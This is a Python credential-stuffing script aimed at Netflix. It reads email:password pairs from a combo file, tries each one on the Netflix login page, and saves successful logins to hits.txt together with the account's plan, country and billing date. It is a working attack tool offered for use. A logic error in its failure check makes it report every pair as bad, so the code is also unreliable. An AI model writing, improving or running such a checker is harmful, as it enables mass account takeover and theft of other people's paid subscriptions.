import os

try:
    import requests
    from bs4 import BeautifulSoup as Soup
except:
    os.system('pip install requests bs4')
    import requests
    from bs4 import BeautifulSoup as Soup

my_ua = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2"


class Netflixer:
    def __init__(self):
        self.combos = []
        self.hits = 0
        self.bad = 0
        self.retries = 0

    def getCombos(self):
        try:
            path = "./combo.txt"
            with open(path, 'r', encoding="utf-8") as f:
                for l in f:
                     self.combos.append(l.replace('\n', ''))
        except:
            print(f'[!] Failed to open combofile')
            quit()
        
    def checker(self, email, password):
        try:     
            client = requests.Session()
            login = client.get("https://www.netflix.com/login", headers ={"User-Agent": my_ua} )
            soup = Soup(login.text,'html.parser')
            loginForm = soup.find('form')
            authURL = loginForm.find('input', {'name': 'authURL'}).get('value')   
            
            headers = {"user-agent": my_ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "accept-language": "en-US,en;q=0.9", "accept-encoding": "gzip, deflate, br", "referer": "https://www.netflix.com/login", "content-type": "application/x-www-form-urlencoded","cookie":""}
            data = {"userLoginId:": email, "password": password, "rememberMeCheckbox": "true", "flow": "websiteSignUp", "mode": "login", "action": "loginAction", "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode", "authURL": authURL, "nextPage": "https://www.netflix.com/browse","countryCode": "+1","countryIsoCode": "US"}  
            
            request = client.post("https://www.netflix.com/login",headers =headers, data =data )
            cookie = dict(flwssn=client.get("https://www.netflix.com/login", headers ={"User-Agent": my_ua}).cookies.get("flwssn"))
            
            if 'Sorry, we can\'t find an account with this email address. Please try again or' or 'Incorrect password' in request.text:
                print(f'[!] BAD | {email} | {password} ')
                self.bad += 1
            
            else:     
                info = client.get("https://www.netflix.com/YourAccount", headers ={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,"Accept-Encoding": "gzip, deflate, br" ,"Accept-Language": "en-US,en;q=0.9" ,"Connection": "keep-alive" ,"Host": "www.netflix.com" ,"Referer": "https://www.netflix.com/browse" ,"Sec-Fetch-Dest": "document" ,"Sec-Fetch-Mode": "navigate" ,"Sec-Fetch-Site": "same-origin" ,"Sec-Fetch-User": "?1" ,"Upgrade-Insecure-Requests": "1" ,"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"}, cookies =cookie, timeout =10).text
                plan = info.split('data-uia="plan-label"><b>')[1].split('</b>')[0]
                country = info.split('","currentCountry":"')[1].split('"')[0]
                expiry = info.split('data-uia="nextBillingDate-item">')[1].split('<')[0]
                print(f'[+] HIT | {email} | {password} | {plan} | {country} | {expiry}')
                self.hits += 1
                with open('hits.txt', 'a', encoding='utf-8') as fp:
                    fp.writelines(f'Email: {email} Pass: {password} - Plan: {plan} - Country: {country} - Validity: {expiry}\n')   
                
        except:
            print(f'[!] ERROR | Idk dude')
            self.retries += 1

    def main(self):
        self.getCombos()
        for c in self.combos:
            ss = c.split(":")
            self.checker(ss[0], ss[1])


        print(f'[+] Task completed')
        
n = Netflixer()
n.main()

